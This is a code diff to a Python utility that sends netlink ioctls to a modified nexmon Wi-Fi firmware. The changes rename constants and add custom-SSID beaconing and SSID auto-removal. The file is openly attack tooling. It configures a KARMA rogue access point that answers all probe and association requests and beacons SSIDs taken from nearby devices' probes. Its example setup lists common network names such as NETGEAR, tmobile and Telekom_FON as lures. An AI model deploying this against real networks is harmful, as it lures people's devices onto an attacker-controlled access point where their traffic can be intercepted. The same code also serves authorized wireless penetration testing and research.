@@ -260,16 +260,17 @@ class nexconf:
 class MaMe82_IO:
 	CMD=666
 	
-	MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA_PROBE = 1
-	MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA_ASSOC = 2
-	MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA = 3
-	MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA_BEACON = 4
-	MAME82_IOCTL_ARG_TYPE_SET_KARMA_BEACON_AUTO_REMOVE = 5
-	MAME82_IOCTL_ARG_TYPE_SET_BEACON_AUTO_REMOVE = 6
+	MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_PROBE = 1
+	MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_ASSOC = 2
+	MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA = 3
+	MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_BEACON = 4
+	MAME82_IOCTL_ARG_TYPE_SET_KARMA_BEACON_AUTO_REMOVE_COUNT = 5
+	MAME82_IOCTL_ARG_TYPE_SET_CUSTOM_BEACON_AUTO_REMOVE_COUNT = 6
 	MAME82_IOCTL_ARG_TYPE_ADD_CUSTOM_SSID = 7
 	MAME82_IOCTL_ARG_TYPE_DEL_CUSTOM_SSID = 8
 	MAME82_IOCTL_ARG_TYPE_CLEAR_CUSTOM_SSIDS = 9
 	MAME82_IOCTL_ARG_TYPE_CLEAR_KARMA_SSIDS = 10
+	MAME82_IOCTL_ARG_TYPE_SET_ENABLE_CUSTOM_BEACONS = 11
 
 	@staticmethod
 	def add_custom_ssid(ssid):
@@ -282,33 +283,42 @@ class MaMe82_IO:
 	@staticmethod
 	def set_enable_karma_probe(on=True):
 		if on:
-			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA_PROBE, 1, 1), True)
+			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_PROBE, 1, 1), True)
 		else:
-			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA_PROBE, 1, 0), True)
+			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_PROBE, 1, 0), True)
 		nexconf.sendNL_IOCTL(ioctl)
 	
 	@staticmethod	
 	def set_enable_karma_assoc(on=True):
 		if on:
-			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA_ASSOC, 1, 1), True)
+			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_ASSOC, 1, 1), True)
 		else:
-			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA_ASSOC, 1, 0), True)
+			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_ASSOC, 1, 0), True)
 		nexconf.sendNL_IOCTL(ioctl)
 		
 	@staticmethod	
 	def set_enable_karma_beaconing(on=True):
 		if on:
-			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA_BEACON, 1, 1), True)
+			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_BEACON, 1, 1), True)
 		else:
-			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA_BEACON, 1, 0), True)
+			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA_BEACON, 1, 0), True)
 		nexconf.sendNL_IOCTL(ioctl)
+
+	@staticmethod	
+	def set_enable_custom_beaconing(on=True):
+		if on:
+			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_CUSTOM_BEACONS, 1, 1), True)
+		else:
+			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_CUSTOM_BEACONS, 1, 0), True)
+		nexconf.sendNL_IOCTL(ioctl)
+
 		
 	@staticmethod	
 	def set_enable_karma(on=True):
 		if on:
-			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA, 1, 1), True)
+			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA, 1, 1), True)
 		else:
-			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_ENABLE_KARMA, 1, 0), True)
+			ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("IIB", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_ENABLE_KARMA, 1, 0), True)
 		nexconf.sendNL_IOCTL(ioctl)
 		
 	@staticmethod	
@@ -320,12 +330,82 @@ class MaMe82_IO:
 	def clear_karma_ssids():
 		ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("II", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_CLEAR_KARMA_SSIDS, 0), True)
 		nexconf.sendNL_IOCTL(ioctl)
+		
+	@staticmethod	
+	def set_autoremove_custom_ssids(beacon_count):
+		ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("III", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_CUSTOM_BEACON_AUTO_REMOVE_COUNT, 4, beacon_count), True)
+		nexconf.sendNL_IOCTL(ioctl)
+		
+	@staticmethod	
+	def set_autoremove_karma_ssids(beacon_count):
+		ioctl = nexconf.create_cmd_ioctl(MaMe82_IO.CMD, struct.pack("III", MaMe82_IO.MAME82_IOCTL_ARG_TYPE_SET_KARMA_BEACON_AUTO_REMOVE_COUNT, 4, beacon_count), True)
+		nexconf.sendNL_IOCTL(ioctl)
 			
+def ioctl_get_test():
+	### Send ioctl comand via netlink: test of GET (cmd 262, value 'bsscfg:ssid' in a buffer large enough to receive the response) ######
 
-MaMe82_IO.set_enable_karma(True) # send probe responses and association responses for foreign SSIDs
-MaMe82_IO.set_enable_karma_beaconing(True) # send beacons for SSIDs seen in probe requests
+	# test to read a IO var for bsscfg:ssid (resp buffer: 4 bytes for uint32 ssid_len, 32 bytes for max len SSID)
+	# Note: 
+	#		The payload buffer size for send and recv are te same (36 in this test case), although the payload sent
+	#		has only 11 bytes ("bsscfg:ssid") which are used. This has no impact for parsing the request for SSID on
+	#		driver/firmware end. This means: We are free to choose the response buffer size, by adjusting the request buffer size.
+	#		In case of the SSID request, the buffer is only partially overwritten with the response (for SSID 'test' only the first 8 bytes).
+	#		The rest of the buffer isn't cleared to 0x00, but the response is prepended with an uint32 length field, which could be used
+	#		to scrape out the relevant part of the response string.
+	#		As I haven't dived into the inner workings of NETLINK, I haven't tested for responses which don't fit in a single message,
+	#		but it is likely that those responses are fragmented over multiple NL messages and the nlmsg_seq header field is used to
+	#		distinguish them. Anyway, this code DOESN'T ACCOUNT FOR THIS AND DOESN'T RECEIVE FRAGMENTED RESPONSES. NOR DOES THIS CODE ACCOUNT
+	#		FOR MAXIMUM MESSAGE SIZE WHEN IT COMES TO SENDING (USING BUFFER WHICH ARE TOO LARGE).
+	#		So this is considered experimental, the correct tool to use is nexutil written by the creators of nexmon ;-)
 
-### send ioctl to add custom SSIDs (which are beaconed indepedent of spotted probes)
+	ioctl_readvar_ssid = nexconf.create_cmd_ioctl(262, struct.pack("36s", "bsscfg:ssid"), False)
+	res = nexconf.sendNL_IOCTL(ioctl_readvar_ssid)
+
+	# clamp result string
+	res_len = struct.unpack("I", res[:4])[0]
+	res_str = res[4:4+res_len]
+	print res_str
+
+
+
+# As soon as an AP is running with hostapd (and backed by the customized nexmon firmware)
+# the IOCTL to set up karma could be received.
+#
+# The hardcoded example commands below bring up a KARMA hotspot (responds to every probe/association
+# request which the STA wants to see), with 13 additional SSIDs and BEACONING enabled for probed SSIDs
+# Additionally the autoremove feature is enabled, for SSIDs not receiving an assoc request in timely
+# manner.
+#
+# Each of this commands could be use to interactively manipulate the firmware from a python console.
+#
+# Example to disable KARMA:
+# --------------------------------
+#	>>> from mame82_util import *
+#	>>> MaMe82_IO.set_enable_karma(False)
+#	Sending NL IOCTL
+#		cmd: 666
+#		set_enabled: True
+#		payload: '\x03\x00\x00\x00\x01\x00\x00\x00\x00'
+#
+#
+# Example to enable KARMA + Beaconing for SSIDs from probe requests:
+# ------------------------------------------------------------------
+#	>>> from mame82_util import *
+#	>>> MaMe82_IO.set_enable_karma(True)
+#	Sending NL IOCTL
+#		cmd: 666
+#		set_enabled: True
+#		payload: '\x03\x00\x00\x00\x01\x00\x00\x00\x01'
+#	>>> MaMe82_IO.set_enable_karma_beaconing(True)
+#	Sending NL IOCTL
+#		cmd: 666
+#		set_enabled: True
+#		payload: '\x04\x00\x00\x00\x01\x00\x00\x00\x01'
+#
+#
+
+
+### Example configuration for MaMe82 KARMA nexmon firmware mod ###
 MaMe82_IO.add_custom_ssid("linksys")
 MaMe82_IO.add_custom_ssid("NETGEAR")
 MaMe82_IO.add_custom_ssid("dlink")
@@ -340,30 +420,12 @@ MaMe82_IO.add_custom_ssid("tmobile")
 MaMe82_IO.add_custom_ssid("Telekom_FON")
 MaMe82_IO.add_custom_ssid("freifunk")
 
+MaMe82_IO.set_enable_karma(True) # send probe responses and association responses for foreign SSIDs
 
+MaMe82_IO.set_enable_karma_beaconing(True) # send beacons for SSIDs seen in probe requests
+MaMe82_IO.set_autoremove_karma_ssids(600) # remove SSIDs from karma beaconing, which didn't received an assoc request after 600 beacons (1 minute)
 
-### Send ioctl comand via netlink: test of GET (cmd 262, value 'bsscfg:ssid' in a buffer large enough to receive the response) ######
-
-# test to read a IO var for bsscfg:ssid (resp buffer: 4 bytes for uint32 ssid_len, 32 bytes for max len SSID)
-# Note: 
-#		The payload buffer size for send and recv are te same (36 in this test case), although the payload sent
-#		has only 11 bytes ("bsscfg:ssid") which are used. This has no impact for parsing the request for SSID on
-#		driver/firmware end. This means: We are free to choose the response buffer size, by adjusting the request buffer size.
-#		In case of the SSID request, the buffer is only partially overwritten with the response (for SSID 'test' only the first 8 bytes).
-#		The rest of the buffer isn't cleared to 0x00, but the response is prepended with an uint32 length field, which could be used
-#		to scrape out the relevant part of the response string.
-#		As I haven't dived into the inner workings of NETLINK, I haven't tested for responses which don't fit in a single message,
-#		but it is likely that those responses are fragmented over multiple NL messages and the nlmsg_seq header field is used to
-#		distinguish them. Anyway, this code DOESN'T ACCOUNT FOR THIS AND DOESN'T RECEIVE FRAGMENTED RESPONSES. NOR DOES THIS CODE ACCOUNT
-#		FOR MAXIMUM MESSAGE SIZE WHEN IT COMES TO SENDING (USING BUFFER WHICH ARE TOO LARGE).
-#		So this is considered experimental, the correct tool to use is nexutil written by the creators of nexmon ;-)
-
-ioctl_readvar_ssid = nexconf.create_cmd_ioctl(262, struct.pack("36s", "bsscfg:ssid"), False)
-res = nexconf.sendNL_IOCTL(ioctl_readvar_ssid)
-
-# clamp result string
-res_len = struct.unpack("I", res[:4])[0]
-res_str = res[4:4+res_len]
-print res_str
+MaMe82_IO.set_enable_custom_beaconing(True) # send beacons for the custom SSIDs set with 'add_custom_ssid'
+MaMe82_IO.set_autoremove_custom_ssids(1800) # remove custom  SSIDs from beaconing list, if they didn't received an assoc request after 1800 beacons (3 minute)
 
 
